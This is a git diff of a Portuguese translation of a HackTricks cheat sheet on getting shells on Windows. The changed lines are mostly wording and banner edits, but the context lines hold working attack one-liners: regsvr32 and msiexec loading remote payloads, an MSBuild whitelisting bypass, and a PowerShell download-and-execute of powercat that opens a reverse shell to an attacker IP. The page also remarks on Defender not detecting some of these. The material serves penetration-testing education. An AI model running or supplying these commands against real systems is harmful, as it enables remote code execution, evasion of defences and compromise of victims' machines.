@@ -6,7 +6,7 @@
 
 Outras maneiras de apoiar o HackTricks:
 
-* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
@@ -14,10 +14,18 @@ Outras maneiras de apoiar o HackTricks:
 
 </details>
 
+**Grupo de Segurança Try Hard**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
+***
+
 ## Lolbas
 
-A página [lolbas-project.github.io](https://lolbas-project.github.io/) é para Windows como [https://gtfobins.github.io/](https://gtfobins.github.io/) é para linux.\
-Obviamente, **não existem arquivos SUID ou privilégios sudo no Windows**, mas é útil saber **como** alguns **binários** podem ser (ab)usados para realizar algum tipo de ação inesperada como **executar código arbitrário.**
+A página [lolbas-project.github.io](https://lolbas-project.github.io/) é para Windows, assim como [https://gtfobins.github.io/](https://gtfobins.github.io/) é para linux.\
+Obviamente, **não existem arquivos SUID ou privilégios sudo no Windows**, mas é útil saber **como** alguns **binários** podem ser (mal)usados para realizar algum tipo de ações inesperadas como **executar código arbitrário.**
 
 ## NC
 ```bash
@@ -210,7 +218,7 @@ rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject(
 ```
 ## Regsvr32
 
-* [Daqui](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+* [A partir daqui](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ```bash
 regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
 ```
@@ -248,7 +256,7 @@ set lhost 10.2.0.5
 run
 #You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
 ```
-**Você pode baixar e executar facilmente um zumbi Koadic usando o stager regsvr**
+**Você pode baixar e executar facilmente um zombie Koadic usando o stager regsvr**
 
 ## Certutil
 
@@ -302,7 +310,7 @@ Vítima:
 ```
 victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 ```
-**Detected**
+**Detectado**
 
 ## **Wmic**
 
@@ -332,7 +340,7 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 ```
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
-Pode usar esta técnica para contornar a Lista Branca de Aplicações e restrições do Powershell.exe. Você será solicitado com um shell PS.\
+Pode usar esta técnica para contornar a Lista Branca de Aplicativos e restrições do Powershell.exe. Você será solicitado com um shell PS.\
 Apenas baixe e execute isso: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
@@ -395,11 +403,11 @@ Baixe, inicie um servidor web, inicie o ouvinte e execute no final da vítima:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-Defender ainda não o detecta como código malicioso (até 3/04/2019).
+Defender não o deteta como código malicioso (ainda, 3/04/2019).
 
 **Outras opções oferecidas pelo powercat:**
 
-Conexão de shells, Shell reverso (TCP, UDP, DNS), Redirecionamento de porta, upload/download, Gerar payloads, Servir arquivos...
+Ligar shells, Shell reverso (TCP, UDP, DNS), Redirecionamento de porta, upload/download, Gerar payloads, Servir ficheiros...
 ```
 Serve a cmd Shell:
 powercat -l -p 443 -e cmd
@@ -442,11 +450,11 @@ Inicie um servidor web servindo o arquivo _powershell\_attack.txt_ e execute no 
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
-**Detectado como código malicioso**
+**Código detectado como malicioso**
 
 ## Mais
 
-[PS>Attack](https://github.com/jaredhaight/PSAttack) Console PS com alguns módulos ofensivos PS pré-carregados (cifrados)\
+[PS>Attack](https://github.com/jaredhaight/PSAttack) Console PS com alguns módulos ofensivos PS pré-carregados (cifrado)\
 [https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
 WinPWN](https://github.com/SecureThisShit/WinPwn) Console PS com alguns módulos ofensivos PS e detecção de proxy (IEX)
 
@@ -460,16 +468,22 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) Console PS com alguns módulos
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 * [https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ​
+**Try Hard Security Group**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
 <details>
 
 <summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Outras formas de apoiar o HackTricks:
 
-* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
-* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
+* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Adquira o [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou nos siga no **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Compartilhe seus truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
